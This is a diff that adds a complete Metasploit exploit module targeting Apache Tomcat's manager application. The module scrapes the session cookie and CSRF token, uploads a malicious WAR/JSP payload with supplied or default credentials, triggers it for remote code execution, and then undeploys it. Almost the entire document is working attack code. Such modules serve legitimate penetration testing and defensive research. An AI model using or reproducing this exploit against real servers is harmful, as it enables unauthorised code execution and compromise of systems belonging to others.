@@ -1,0 +1,426 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  HttpFingerprint = { :pattern => [ /Apache.*(Coyote|Tomcat)/ ] }
+
+  CSRF_VAR = 'CSRF_NONCE='
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'Apache Tomcat Manager Application Upload Authenticated Code Execution',
+      'Description' => %q{
+        This module can be used to execute a payload on Apache Tomcat servers that
+        have an exposed "manager" application. The payload is uploaded as a WAR archive
+        containing a jsp application using a POST request against the /manager/html/upload
+        component.
+
+        NOTE: The compatible payload sets vary based on the selected target. For
+        example, you must select the Windows target to use native Windows payloads.
+      },
+      'Author'      => 'rangercha',
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          # This is based on jduck's tomcat_mgr_deploy.
+          # the tomcat_mgr_deploy o longer works for current versions of tomcat due to
+          # CSRF protection tokens. Also PUT requests against the /manager/html/deploy
+          # aren't allowed anymore.
+
+          # There is no single vulnerability associated with deployment functionality.
+          # Instead, the focus has been on insecure/blank/hardcoded default passwords.
+
+          #  The following references refer to HP Operations Manager
+          ['CVE', '2009-3843'],
+          ['OSVDB', '60317'],
+          ['CVE', '2009-4189'],
+          ['OSVDB', '60670'],
+
+          # HP Operations Dashboard
+          ['CVE', '2009-4188'],
+
+          # IBM Cognos Express Default user/pass
+          ['BID', '38084'],
+          ['CVE', '2010-0557'],
+          ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179'],
+
+          # IBM Rational Quality Manager and Test Lab Manager
+          ['CVE', '2010-4094'],
+          ['ZDI', '10-214'],
+
+          # 'admin' password is blank in default Windows installer
+          ['CVE', '2009-3548'],
+          ['OSVDB', '60176'],
+          ['BID', '36954'],
+
+          # tomcat docs
+          ['URL', 'http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html']
+        ],
+      'Platform'    => %w{ java linux win }, # others?
+      'Targets'     =>
+        [
+          [ 'Java Universal',
+            {
+              'Arch'     => ARCH_JAVA,
+              'Platform' => 'java'
+            }
+          ],
+          #
+          # Platform specific targets only
+          #
+          [ 'Windows Universal',
+            {
+              'Arch'     => ARCH_X86,
+              'Platform' => 'win'
+            }
+          ],
+          [ 'Linux x86',
+            {
+              'Arch'     => ARCH_X86,
+              'Platform' => 'linux'
+            }
+          ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Nov 09 2009'))
+
+    register_options(
+      [
+        OptString.new('USERNAME', [false, 'The username to authenticate as']),
+        OptString.new('PASSWORD', [false, 'The password for the specified username']),
+        # /cognos_express/manager/ for Cognos Express (19300)
+        OptString.new('TARGETURI', [true, "The URI path of the manager app (/html/upload and /undeploy will be used)", '/manager'])
+      ], self.class)
+  end
+
+  def check
+    res = query_manager
+    disconnect
+
+    return CheckCode::Unknown if res.nil?
+
+    if res.code.between?(400, 499)
+      vprint_error("#{peer} - Server rejected the credentials")
+      return CheckCode::Unknown
+    end
+
+    return CheckCode::Safe unless res.code == 200
+
+    # if res.code == 200
+    #   there should be access to the Tomcat Manager and to the status page
+    res = query_status
+    return CheckCode::Unknown unless res
+
+    plat = detect_platform(res.body)
+    arch = detect_arch(res.body)
+    return CheckCode::Unknown unless plat and arch
+
+    vprint_status("#{peer} - Tomcat Manager found running on #{plat} platform and #{arch} architecture")
+
+    report_auth_info(
+      :host   => rhost,
+      :port   => rport,
+      :sname  => (ssl ? "https" : "http"),
+      :user   => datastore['USERNAME'],
+      :pass   => datastore['PASSWORD'],
+      :proof  => "WEBAPP=\"Tomcat Manager App\", VHOST=#{vhost}, PATH=#{datastore['PATH']}",
+      :active => true
+    )
+
+    return CheckCode::Appears
+  end
+
+  def exploit
+    @app_base = rand_text_alphanumeric(4 + rand(32 - 4))
+    @jsp_name = rand_text_alphanumeric(4 + rand(32 - 4))
+
+    #
+    # Find the session ID and the CSRF token
+    #
+    print_status("#{peer} - Retrieving session ID and CSRF token...")
+    unless access_manager?
+      fail_with(Failure::Unknown, "Unable to access the Tomcat Manager")
+    end
+
+    #
+    # Upload Payload
+    #
+    print_status("#{peer} - Uploading and deploying #{@app_base}...")
+    if upload_payload
+      report_auth_info(
+        :host   => rhost,
+        :port   => rport,
+        :sname  => (ssl ? "https" : "http"),
+        :user   => datastore['USERNAME'],
+        :pass   => datastore['PASSWORD'],
+        :proof  => "WEBAPP=\"Tomcat Manager App\", VHOST=#{vhost}, PATH=#{datastore['PATH']}",
+        :active => true
+      )
+    else
+      fail_with(Failure::Unknown, "Upload failed")
+    end
+
+    #
+    # Execute Payload
+    #
+    print_status("#{peer} - Executing #{@app_base}...")
+    unless execute_payload
+      fail_with(Failure::Unknown, "Failed to execute the payload")
+    end
+
+    #
+    # Get the new CSRF token & session id
+    #
+    unless access_manager?
+      fail_with(Failure::Unknown, "Unable to access the Tomcat Manager")
+    end
+
+    #
+    # Delete the deployed payload
+    #
+    print_status("#{peer} - Undeploying #{@app_base} ...")
+    unless undeploy_app
+      print_warning("#{peer} - Failed to undeploy #{@app_base}...")
+    end
+  end
+
+  def query_status
+    path = normalize_uri(target_uri.path.to_s, 'status')
+    res = send_request_raw('uri' => path)
+
+    unless res and res.code == 200
+      vprint_error("Failed: Error requesting #{path}")
+      return nil
+    end
+
+    return res
+  end
+
+  def query_manager
+    path = normalize_uri(target_uri.path.to_s, '/html')
+    res = send_request_raw('uri' => path)
+
+    return res
+  end
+
+  def vars_get
+    vars = {}
+    unless @csrf_token.nil?
+      vars = {
+        "path" => @app_base,
+        "org.apache.catalina.filters.CSRF_NONCE" => @csrf_token
+      }
+    end
+
+    return vars
+  end
+
+  def detect_platform(body)
+    return nil if body.blank?
+
+    i=0
+
+    body.each_line do |ln|
+      ln.chomp!
+
+      i = 1 if ln =~ /OS Name/
+
+      if i == 9 or i == 11
+        if ln.include? "Windows"
+          return 'win'
+        elsif ln.include? "Linux"
+          return 'linux'
+        elsif i==11
+          return 'unknown'
+        end
+      end
+
+      i = i+1 if i > 0
+    end
+  end
+
+  def detect_arch(body)
+    return nil if body.blank?
+
+    i=0
+    body.each_line do |ln|
+      ln.chomp!
+
+      i = 1 if ln =~ /OS Architecture/
+
+      if i==9 or i==11
+        if ln.include? 'x86'
+          return ARCH_X86
+        elsif ln.include? 'i386'
+          return ARCH_X86
+        elsif ln.include? 'i686'
+          return ARCH_X86
+        elsif ln.include? 'x86_64'
+          return ARCH_X86
+        elsif ln.include? 'amd64'
+          return ARCH_X86
+        elsif i==11
+          return 'unknown'
+        end
+      end
+
+      i = i + 1 if i > 0
+    end
+  end
+
+  def find_csrf(res = nil)
+    return "" if res.blank?
+
+    vprint_status("#{peer} - Finding CSRF token...")
+
+    body = res.body
+
+    body.each_line do |ln|
+      ln.chomp!
+      csrf_nonce = ln.index(CSRF_VAR)
+      next if csrf_nonce.nil?
+      token = ln[csrf_nonce + CSRF_VAR.length, 32]
+      return token
+    end
+
+    return ""
+  end
+
+  def generate_multipart_msg(boundary, data)
+    # Rex::MIME::Message is breaking the binary upload when trying to
+    # enforce CRLF for SMTP compatibility
+    war_multipart = "-----------------------------"
+    war_multipart << boundary
+    war_multipart << "\r\nContent-Disposition: form-data; name=\"deployWar\"; filename=\""
+    war_multipart << @app_base
+    war_multipart << ".war\"\r\nContent-Type: application/octet-stream\r\n\r\n"
+    war_multipart << data
+    war_multipart << "\r\n-----------------------------"
+    war_multipart << boundary
+    war_multipart << "--\r\n"
+  end
+
+  def war_payload
+    payload.encoded_war({
+      :app_name => @app_base,
+      :jsp_name => @jsp_name,
+      :arch => target.arch,
+      :platform => target.platform
+    }).to_s
+  end
+
+  def send_war_payload(url, war)
+    boundary_identifier = rand_text_numeric(28)
+
+    res = send_request_cgi({
+      'uri'          => url,
+      'method'       => 'POST',
+      'ctype'        => 'multipart/form-data; boundary=---------------------------' + boundary_identifier,
+      'user'         => datastore['USERNAME'],
+      'password'     => datastore['PASSWORD'],
+      'cookie'       => @session_id,
+      'vars_get'     => vars_get,
+      'data'         => generate_multipart_msg(boundary_identifier, war),
+    })
+
+    return res
+  end
+
+  def send_request_undeploy(url)
+    res = send_request_cgi({
+      'uri'          => url,
+      'vars_get'     => vars_get,
+      'method'       => 'POST',
+      'user'         => datastore['USERNAME'],
+      'password'     => datastore['PASSWORD'],
+      'cookie'       => @session_id
+    })
+
+    return res
+  end
+
+  def access_manager?
+    res = query_manager
+    return false unless res and res.code == 200
+    @session_id = res.get_cookies
+    @csrf_token = find_csrf(res)
+    return true
+  end
+
+  def upload_payload
+    war = war_payload
+    upload_path = normalize_uri(target_uri.path.to_s, "html", "upload")
+    vprint_status("#{peer} - Uploading #{war.length} bytes as #{@app_base}.war ...")
+    res = send_war_payload(upload_path, war)
+    return parse_upload_response(res)
+  end
+
+  def parse_upload_response(res)
+    unless res
+      vprint_error("#{peer} - Upload failed on #{upload_path} [No Response]")
+      return false
+    end
+
+    if res.code < 200 or res.code >= 300
+      vprint_warning("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}") if res.code == 401
+      vprint_error("Upload failed on #{upload_path} [#{res.code} #{res.message}]")
+      return false
+    end
+
+    return true
+  end
+
+  def execute_payload
+    jsp_path = normalize_uri(@app_base, "#{@jsp_name}.jsp")
+
+    vprint_status("#{peer} - Executing #{jsp_path}...")
+
+    res = send_request_cgi({
+      'uri'          => jsp_path,
+      'method'       => 'GET'
+    })
+
+    return parse_execute_response(res)
+  end
+
+  def parse_execute_response(res)
+    unless res
+      vprint_error("#{peer} - Execution failed on #{@app_base} [No Response]")
+      return false
+    end
+
+    if res and (res.code < 200 or res.code >= 300)
+      vprint_error("#{peer} - Execution failed on #{@app_base} [#{res.code} #{res.message}]")
+      return false
+    end
+
+    return true
+  end
+
+  def undeploy_app
+    undeploy_url = normalize_uri(target_uri.path.to_s, "html", "undeploy")
+    res = send_request_undeploy(undeploy_url)
+
+    unless res
+      vprint_warning("#{peer} - WARNING: Undeployment failed on #{undeploy_url} [No Response]")
+      return false
+    end
+
+    if res and (res.code < 200 or res.code >= 300)
+      vprint_warning("#{peer} - Deletion failed on #{undeploy_url} [#{res.code} #{res.message}]")
+      return false
+    end
+
+    return true
+  end
+
+end
